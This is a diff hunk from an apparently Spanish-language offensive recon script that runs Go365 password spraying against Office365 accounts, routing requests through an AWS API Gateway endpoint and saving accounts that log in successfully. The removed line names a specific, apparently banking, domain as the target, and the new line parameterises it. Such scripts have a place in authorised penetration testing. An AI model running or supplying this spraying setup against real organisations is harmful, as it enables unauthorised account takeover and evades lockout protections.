@@ -263,7 +263,7 @@ fi
 if [ -f .enumeracion2/"$DOMINIO"_office365_users.txt ]
 then		
 	echo -e "[+] Probando Office365 passwords"
-	Go365 -endpoint rst -ul .enumeracion2/bancofie.com.bo_office365_users.txt -pl top10.txt -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
+	Go365 -endpoint rst -ul .enumeracion2/"$DOMINIO"_office365_users.txt -pl top10.txt -d $DOMINIO -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
 	grep 'valid login' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
 	
 	# for password in $(cat top10.txt); do
